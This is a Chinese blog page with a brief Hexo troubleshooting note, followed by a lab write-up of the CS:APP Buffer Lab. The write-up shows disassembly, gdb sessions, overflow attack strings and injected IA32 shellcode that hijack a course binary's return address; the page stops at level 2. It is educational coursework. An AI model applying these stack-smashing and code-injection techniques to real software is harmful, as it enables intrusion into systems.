<h2 id="hexo-server报EMFILE错误"><a href="#hexo-server报EMFILE错误" class="headerlink" title="hexo server报EMFILE错误"></a>hexo server报EMFILE错误</h2><p>报错内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Error: EMFILE, too many open files</div></pre></td></tr></table></figure><br>Hexo官网的<a href="https://hexo.io/zh-cn/docs/troubleshooting.html" target="_blank" rel="external">问题解答</a>中给出了如下描述：<br>虽然 Node.js 有非阻塞 I/O，同步 I/O 的数量仍被系统所限制，在生成大量静态文件的时候，您可能会碰到 EMFILE 错误，您可以尝试提高同步 I/O 的限制数量来解决此问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ulimit -n 10000</div></pre></td></tr></table></figure><br>但是当我尝试使用ulimit的时候，却报了如下的错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Permission denied when changing resource of type &apos;Maximum number of open file descriptors&apos;</div></pre></td></tr></table></figure><br>在这之后进行了如下的尝试：</p>
<ol>
<li>使用sudo无法运行ulimit，后su至root运行，虽然没有报错，但是使用<code>ulimit -n</code>查看发现修改失败。</li>
<li>尝试添加参数-S和-H，没有效果。</li>
<li>最后根据<a href="https://bbs.archlinux.org/viewtopic.php?id=202694" target="_blank" rel="external">Arch Forum</a>上的回答，修改了<code>/etc/security/limits.conf</code>文件并重启电脑，问题解决。</li>
</ol>
<h2 id="hexo-server报ENOSPC错误"><a href="#hexo-server报ENOSPC错误" class="headerlink" title="hexo server报ENOSPC错误"></a>hexo server报ENOSPC错误</h2><p>Hexo官网的<a href="https://hexo.io/zh-cn/docs/troubleshooting.html" target="_blank" rel="external">问题解答</a>中给出了如下描述：<br>它可以用过运行 <code>$ npm dedupe</code> 来解决，如果不起作用的话，可以尝试在 Linux 终端中运行下列命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf &amp;&amp; sudo sysctl -p</div></pre></td></tr></table></figure><br>这将会提高你能监视的文件数量。<br><code>$ npm dedupe</code>没有解决问题，最后使用上述的命令解决了问题。（注意在fish中，<code>&#39;&amp;&amp;&#39;</code>要用<code>&#39;COMMAND; and COMMAND&#39;</code>来替代）</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/07/06/Arch下Hexo配置的问题总结/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/05/16/深入理解计算机系统BufferLab实验报告/">
                            深入理解计算机系统BufferLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-05-16T14:28:12+08:00">
	
		    5月 16, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/BufferLab" target="_blank" rel="external">Github</a>上</p>
<blockquote>
<p>Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
<p>该实验加深了对于栈规则的理解以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>该实验同Attack Lab非常相似，但是仅仅采用了代码注入攻击作为攻击手段。同时，也要注意x86和x86_64有着不同的栈帧以及过程的调用方式。</p>
<h3 id="IA32的栈帧以及过程调用"><a href="#IA32的栈帧以及过程调用" class="headerlink" title="IA32的栈帧以及过程调用"></a>IA32的栈帧以及过程调用</h3><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p>
<p>调用者的栈帧主要包括了参数区以及返回地址。</p>
<p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p>
<h4 id="IA32的过程调用"><a href="#IA32的过程调用" class="headerlink" title="IA32的过程调用"></a>IA32的过程调用</h4><p>IA32提供了如下的过程调用指令：</p>
<ul>
<li>call 该指令将返回地址压入调用者的栈帧，并且将程序计数器%eip指向了被调用者的首地址</li>
<li>leave 该指令一般位于ret指令之前，等价于mov %ebp,%esp和pop %ebp，主要作用是回收栈空间，并且恢复栈顶（%esp）和栈底（%ebp）使得栈帧恢复为调用者栈帧</li>
<li>ret 该指令从栈中弹出返回地址并且让程序计数器eip指向该地址，使程序继续执行被调用者的下一条指令</li>
</ul>
<p>IA32的过程调用遵循如下的规则：</p>
<ol>
<li>首先执行call指令，call会在调用者的栈顶压入返回地址并且使程序计数器指向被调用者</li>
<li>然后保存调用者的栈底即push %ebp，并且将栈顶设置为被调用者的栈底即mov %esp,%ebp</li>
<li>分配局部的栈空间，主要用于临时变量的存储</li>
<li>执行被调用者的指令</li>
<li>执行leave，释放栈空间并重置栈顶（%esp）和栈底（%ebp），使得恢复为调用者栈帧</li>
<li>执行ret，过程返回并继续执行调用者的指令</li>
</ol>
<p>IA32的参数传递规则：<br>同x86不同，IA32不使用寄存器进行参数的传递，IA32从右到左将参数依次压栈，然后调用相应的过程。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p>
<ul>
<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
<li>makecookie 根据你所输入的userid生成一个cookie</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<p>首先我们要输入userid生成一个cookie供后续使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie BlackDragon &gt; cookie                          </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie                                              </div><div class="line">0x3dde924c</div></pre></td></tr></table></figure></p>
<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d bufbomb &gt; bufbomb-disassemble</div></pre></td></tr></table></figure></p>
<h3 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h3><p>目标程序的通过getbuf函数从标准输入流中读取字符串，并且该函数和Attack Lab中的函数一致，且具有缓冲区溢出的漏洞。这里不再赘述。</p>
<p>值得注意的是，bufbomb函数接受如下的参数：</p>
<ul>
<li>-h 打印帮助信息</li>
<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
<li>-n 进入’Nitro’模式，在阶段4中使用</li>
<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
</ul>
<p>同Attack Lab一样，你需要使用hex2raw从攻击代码生成相应的攻击字符串，这里也不再赘述。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0：蜡烛（Candle）"><a href="#阶段0：蜡烛（Candle）" class="headerlink" title="阶段0：蜡烛（Candle）"></a>阶段0：蜡烛（Candle）</h3><p>在本实验中，关键函数getbuf被test函数调用，getbuf和test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* getbuf */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE ??</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</div><div class="line">Gets(buf);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* test */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> val;</div><div class="line"><span class="comment">/* Put canary on stack to detect possible corruption */</span></div><div class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</div><div class="line"></div><div class="line">val = getbuf();</div><div class="line"></div><div class="line"><span class="comment">/* Check for corrupted stack */</span></div><div class="line"><span class="keyword">if</span> (local != uniqueval()) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</div><div class="line">validate(<span class="number">3</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Smoke!: You called smoke()\n"</span>);</div><div class="line">validate(<span class="number">0</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先我们需要确定缓冲区的大小，观察bufbomb-disassemble中getbuf的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080491f4 &lt;getbuf&gt;:</div><div class="line"> 80491f4:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 80491f5:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 80491f7:       <span class="number">83</span> ec <span class="number">38</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x38,%esp</div><div class="line"> 80491fa:       <span class="number">8d</span> <span class="number">45</span> d8                <span class="keyword">lea</span>    -<span class="number">0x28</span>(%ebp),%eax</div><div class="line"> 80491fd:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                <span class="keyword">mov</span>    %eax,(%esp)</div><div class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          <span class="keyword">call</span>   8048cfa &lt;Gets&gt;</div><div class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</div><div class="line"> 804920a:       c9                      <span class="keyword">leave</span>  </div><div class="line"> 804920b:       c3                      <span class="keyword">ret</span>   </div></pre></td></tr></table></figure></p>
<p>注意到函数总共开辟了0x38=56个字节的栈空间，然后lea -0x28(%ebp),%eax mov %eax,(%esp)进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而ebp指向栈底，我们可以推测缓冲区总共是0x28=40个字节。</p>
<p>经过实际测试，可以确定缓冲区确实是40个字节。</p>
<p>下面我们观察反汇编代码，可以得出函数smoke的起始地址为0x08048c18，根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 18 8c 04 08 /* 保存的%ebp以及返回地址 */</div></pre></td></tr></table></figure></p>
<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level0.txt|./hex2raw|./bufbomb -u BlackDragon             </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div><div class="line">run with level1</div></pre></td></tr></table></figure></p>
<p>阶段0完成。</p>
<h3 id="阶段1：火花（Sparkler）"><a href="#阶段1：火花（Sparkler）" class="headerlink" title="阶段1：火花（Sparkler）"></a>阶段1：火花（Sparkler）</h3><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (val == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>, val);</div><div class="line">validate(<span class="number">1</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: You called fizz(0x%x)\n"</span>, val);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">08048c42 &lt;fizz&gt;:</div><div class="line"> 8048c42:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 8048c43:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 8048c45:       <span class="number">83</span> ec <span class="number">18</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x18,%esp</div><div class="line"> 8048c48:       8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="number">0x8</span>(%ebp),%eax</div><div class="line"> 8048c4b:       3b <span class="number">05</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%eax</div><div class="line"> 8048c51:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048c79 &lt;fizz+<span class="number">0x37</span>&gt;</div><div class="line"> 8048c53:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048c57:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> ee a4 <span class="number">04</span>    movl   <span class="number">$0</span>x804a4ee,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048c5e:       <span class="number">08</span></div><div class="line"> 8048c5f:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c66:       e8 <span class="number">55</span> fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c6b:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c72:       e8 <span class="number">04</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</div><div class="line"> 8048c77:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048c91 &lt;fizz+<span class="number">0x4f</span>&gt;</div><div class="line"> 8048c79:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048c7d:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">40</span> a3 <span class="number">04</span>    movl   <span class="number">$0</span>x804a340,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048c84:       <span class="number">08</span></div><div class="line"> 8048c85:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c8c:       e8 2f fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c91:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x0,(%esp)</div><div class="line"> 8048c98:       e8 <span class="number">63</span> fc ff ff          <span class="keyword">call</span>   <span class="number">8048900</span> &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数fizz的起始地址为0x08048c42，val保存在0x8(%ebp)中，cookie保存在固定的地址0x804d108中。根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 42 8c 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 4c 92 de 3d /* cookie */</div></pre></td></tr></table></figure></p>
<p>在该攻击代码中，前48个字节同阶段0一样，只是将返回地址改成了了函数fizz的起始地址。而最后8个字节则是用来伪装成传递参数的。注意函数从getbuf返回后并不会真正的调用fizz函数，而只是依次的开始执行fizz的指令。</p>
<p>因此，从getbuf返回直到获取到参数val这整个过程中，首先getbuf返回会执行复位操作，将栈顶（%esp）指向第40个字节处（从0开始计算，下同），然后将0x0pop至栈底（%ebp），最后根据返回地址跳转至fizz并pop。现在栈顶（%esp）指向了第48个字节。紧接着，直接开始执行fizz的指令，将%ebp（0）入栈，直至执行到mov 0x8(%ebp),%eax，栈顶（%esp）指向第44个字节。所以，我们的cookie应当放在第(44+8=52）个字节处，直到第55个字节为止。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level1.txt|./hex2raw|./bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Fizz!: You called fizz(0x3dde924c)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段1完成。</p>
<h3 id="阶段2：爆竹（FireCracker）"><a href="#阶段2：爆竹（FireCracker）" class="headerlink" title="阶段2：爆竹（FireCracker）"></a>阶段2：爆竹（FireCracker）</h3><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (global_value == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</div><div class="line">validate(<span class="number">2</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。</p>
<p>该阶段同Attack Lab第1部分的等级2相似，我们需要将程序计数器%eip指向栈，在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang。</p>
<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gdb bufbomb                                           </div><div class="line">GNU gdb (GDB) 7.12.1</div><div class="line">Copyright (C) 2017 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></div><div class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</div><div class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</div><div class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</div><div class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...<span class="keyword">done</span>.</div><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x80491fa</div><div class="line">(gdb) run -u BlackDragon</div><div class="line">Starting program: /home/user/CSAPPLabs/BufferLab/buflab-handout/bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line"></div><div class="line">Breakpoint 1, 0x080491fa <span class="keyword">in</span> getbuf ()</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</div><div class="line">   0x080491f4 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x080491f5 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x080491f7 &lt;+3&gt;:	sub    <span class="variable">$0x38</span>,%esp</div><div class="line">=&gt; 0x080491fa &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x080491fd &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08049200 &lt;+12&gt;:	call   0x8048cfa &lt;Gets&gt;</div><div class="line">   0x08049205 &lt;+17&gt;:	mov    <span class="variable">$0x1</span>,%eax</div><div class="line">   0x0804920a &lt;+22&gt;:	leave  </div><div class="line">   0x0804920b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></div><div class="line"><span class="variable">$1</span> = 0x55682f18</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></div><div class="line"><span class="variable">$2</span> = 0x55682f50</div></pre></td></tr></table></figure></p>
<p>通过在gdb中添加断点并观察，我们可以确定在执行函数getbuf时，栈底（%ebp）的值为0x55682f50。</p>
<p>接下来我们要通过gcc和objdump生成攻击代码，具体的操作和Attack Lab相似，我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax</div><div class="line"><span class="keyword">mov</span> %eax, <span class="number">0x804d100</span> <span class="comment">;设置全局变量</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %esp <span class="comment">;修改栈顶</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure></p>
<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o &gt; level2-exploit.d</code>将攻击代码汇编和反汇编，具体的命令和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gcc -m32 -c level2-exploit.s                          </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d level2-exploit.o &gt; level2-exploit.d</div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2-exploit.d                                    </div><div class="line"></div><div class="line">level2-exploit.o：     文件格式 elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 4c 92 de 3d       	mov    <span class="variable">$0x3dde924c</span>,%eax</div><div class="line">   5:	a3 00 d1 04 08       	mov    %eax,0x804d100</div><div class="line">   a:	83 c4 10             	add    <span class="variable">$0x10</span>,%esp</div><div class="line">   d:	c3                   	ret     </div></pre></td></tr></table></figure>　</p>
